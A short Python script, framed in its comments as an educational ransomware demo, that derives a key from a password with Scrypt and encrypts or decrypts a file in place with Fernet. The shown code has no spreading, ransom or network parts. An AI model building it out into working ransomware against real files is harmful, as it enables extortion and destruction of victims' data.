import pathlib
import secrets      # use to salt the password. generates strong random numbers (better than 'random' module)
import os
import base64
import getpass
import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt

# this is a very simple kind of ransomware, meant to demonstrate the basic concepts, NOT for actual real-world usage (for educational purposes only)

# this uses AES for symmetric key encryption (same key to encrypt and decrypt)


# generate the salt used for key derivation, `size` is the length of the salt to generate
def generate_salt(size=16):
    return secrets.token_bytes(size)


# derives the key from the password and the salt
def derive_key(salt, password):

    # 'length' - length of the key 
    # 'n' - CPU/memory cost, must be larger than 1 and a power of 2
    # 'r' - block size
    # 'p' - parallelization
    # recommended values: "r=8, p=1, n=2**14 or 2**20 for sensitive files"

    # https://cryptography.io/en/latest/hazmat/primitives/key-derivation-functions/#cryptography.hazmat.primitives.kdf.scrypt.Scrypt
    
    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)

    return kdf.derive(password.encode())


# load salt from salt.salt file
def load_salt():
    return open("salt.salt", "rb").read()


# generate a key from password and salt.
def generate_key(password, salt_size=16, load_existing_salt=False, save_salt=True):
    # if `load_existing_salt` is True, it'll load the salt from 'salt.salt' in current directory
    # if `save_salt` is True, then it will generate a new salt and save it to "salt.salt" in current directory
    
    if load_existing_salt:
        salt = load_salt()

    # generate new salt and save it
    elif save_salt:
        salt = generate_salt(salt_size)
        with open("salt.salt", "wb") as salt_file:      # open(filename, write binary)
            salt_file.write(salt)
    
    # generate the key from the salt and the password
    derived_key = derive_key(salt, password)
    
    # encode the key with Base 64 and return it
    return base64.urlsafe_b64encode(derived_key)


# given a filename (str) and key (bytes), encrypt the file's data and overwrite it
def encrypt(filename, key):

    f = Fernet(key)     # make Fernet object with the key
    
    with open(filename, "rb") as file:  # read the data of the file that'll be encrypted. open(filename, read binary)
        file_data = file.read()

    encrypted_data = f.encrypt(file_data)   # encrypt data with 'encrypt' method from Fernet

    with open(filename, "wb") as file:      # take encrypted_data and and overwrite the original file. open(filename, write binary)
        file.write(encrypted_data)


# given a filename (str) and key (bytes), decrypt the file's encrypted data and overwrite it
def decrypt(filename, key):
    f = Fernet(key)

    with open(filename, "rb") as file:  # read encrypted data
        encrypted_data = file.read()

    try:                                # decrypt data with 'decrypt' method from Fernet
        decrypted_data = f.decrypt(encrypted_data)

    except cryptography.fernet.InvalidToken:    # ERROR (password incorrect, or it might be a weird error)
        print("[!] Invalid token. Password is probably incorrect.")
        return

    with open(filename, "wb") as file:      # take decrypted_data and overwrite the encrypted file
        file.write(decrypted_data)


